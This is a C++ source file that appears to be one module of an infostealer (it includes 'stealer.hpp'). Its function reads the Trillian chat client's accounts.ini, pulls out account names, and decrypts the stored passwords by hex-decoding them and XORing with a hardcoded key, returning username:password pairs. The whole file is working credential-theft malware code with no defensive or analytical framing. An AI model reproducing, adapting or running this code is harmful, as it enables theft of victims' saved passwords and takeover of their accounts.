#include "../stealer.hpp"

string GetTrillianPasswords( API* api, string accounts ) {
	string ret = "";
	try {
		BYTE bMagicTrillian[]={ 243, 38, 129, 196, 57, 134, 219, 146, 113, 163, 185, 230, 83, 122, 149, 124, 0, 0, 0, 0, 0, 0, 255, 0, 0, 128, 0, 0, 0, 128, 128, 0, 255, 0, 0, 0, 128, 0, 128, 0, 128, 128, 0, 0, 0, 128, 255, 0, 128, 0, 255, 0, 128, 128, 128, 0, 85, 110, 97, 98, 108, 101, 32, 116, 111, 32, 114, 101, 115, 111, 108, 118, 101, 32, 72, 84, 84, 80, 32, 112, 114, 111, 120, 0 };
		accounts += "Trillian\\users\\global\\accounts.ini";
		string ini = GetFileData(api, accounts);
		string currline = "";
		int line = 0, user = 0;
		currline = ini.substr(0, ini.find_first_of('\n') + 1);
		while(currline.find("[Accounts]") == string::npos && currline != "") {
			currline = ini.substr(0, ini.find_first_of('\n') + 1);
			line++;
			if (currline.find("Account=") != string::npos) {
				user = line;
				ret += "TR: ";
				ret += currline.substr(api->lstrlen("Account="), currline.length() - api->lstrlen("Account="));
				ret[ret.length() - 1] = '\0';
				ret[ret.length() - 2] = '\0'; 
				ret += ":";
			} else if (currline.find("Password=") != string::npos && currline.find("Save Password=") == string::npos) {
				char strEncPassword[80] = "\0";
				char strClearPassword[40] = "\0";
				api->lstrcpy(strEncPassword, (char*)(api->magic(currline.substr(api->lstrlen("Password="), currline.length() - api->lstrlen("Password"))).c_str()));
				int i = 0;
				char a, c;
				for(i = 0; strEncPassword[2 * i] && strEncPassword[ 2 * i + 1]; i++) {
					a = strEncPassword[2*i];
					if( a >= '0' && a <= '9' )
						c = a - '0';
					else
						c = 0xA + (a - 'A');
					a = strEncPassword[2*i+1];
					if( a >= '0' && a <= '9' )
						a = a - '0';
					else
						a = 0xA + (a - 'A');

					c = (c << 4) + a;
					strClearPassword[i] = c ^ bMagicTrillian[i];
				}
				strClearPassword[i] = '\0';
				ret += strClearPassword;
				ret += "\n";
				line = 0;
				user = 0;
			}
			if (line > user + 3) {
				ret += "\n";
				line = 0; user = 0;
			}
			ini.erase(0, ini.find_first_of('\n') + 1);
		}
	} catch (...) {
	}
	return ret;
}
